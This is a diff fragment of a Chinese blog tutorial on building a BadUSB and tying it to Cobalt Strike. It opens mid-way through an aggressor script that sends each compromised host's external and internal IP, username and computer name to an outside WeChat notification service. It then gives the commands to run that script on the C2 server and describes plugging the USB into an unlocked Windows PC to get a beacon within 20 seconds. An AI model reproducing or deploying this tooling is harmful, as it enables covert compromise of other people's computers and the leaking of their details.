class="hljs-variable">%a4</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%91</span>ip:&#x27;.$externalIP.&#x27;<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e5</span><span class="hljs-variable">%86</span><span class="hljs-variable">%85</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%91</span>ip:&#x27;.$internalIP.&#x27;<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e7</span><span class="hljs-variable">%94</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>d:&#x27;.$userName.&#x27;<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e8</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%97</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>d:&#x27;.$computerName<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>http_get($url)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>&#125;<br><br>LLVM<br></code></pre></td></tr></table></figure>
+
+<p>在以上代码填写好自己的SendKey之后，保存为weixinNotice.cna文件，上传到云服务器的CS4根目录，在CS4服务端开启的情况下（如果没开启自行开启后再下一步）使用下列命令，开启微信提醒脚本并在后台保持运行：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">screen -S cs4-notice<br>./agscript xxx<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span> <span class="hljs-number">5044</span> 用户名 密码 weixinNotice<span class="hljs-selector-class">.cna</span><br>Ctrl+a，松开，再按d <span class="hljs-comment">//会话后台运行</span><br><br>STYLUS<br></code></pre></td></tr></table></figure>
+
+<h5 id="8-实战"><a href="#8-实战" class="headerlink" title="8.实战"></a>8.实战</h5><p>将usb插入一个未关机的windows系统电脑，20秒后微信会收到cs上线提醒：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813222635987.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813222635987.png" srcset="/img/loading.gif" lazyload alt="image-20220813222635987"></a></p>
+<p>image-20220813222635987</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813223610164.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813223610164.png" srcset="/img/loading.gif" lazyload alt="image-20220813223610164"></a></p>
+<p>image-20220813223610164</p>
+<p>（再次强调，仅作为技术分享，请勿用于非法行为！！！）</p>
+<p>本文参考：<a target="_blank" rel="noopener" href="http://greatagain.688023.cn/#/book/search/detail?id=XcSgdPZjJvff&type=1">http://greatagain.688023.cn/#/book/search/detail?id=XcSgdPZjJvff&amp;type=1</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%9E%E6%88%98/" class="category-chain-item">实战</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>badsub制作</div>
+      <div>http://example.com/2023/08/13/badsub制作/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Franky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/20/Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%EF%BC%89/" title="Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/09/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-11776)/" title="Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776)">
+                        <span class="hidden-mobile">Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="" target="_blank" rel="nofollow noopener"><span></span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Franky</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
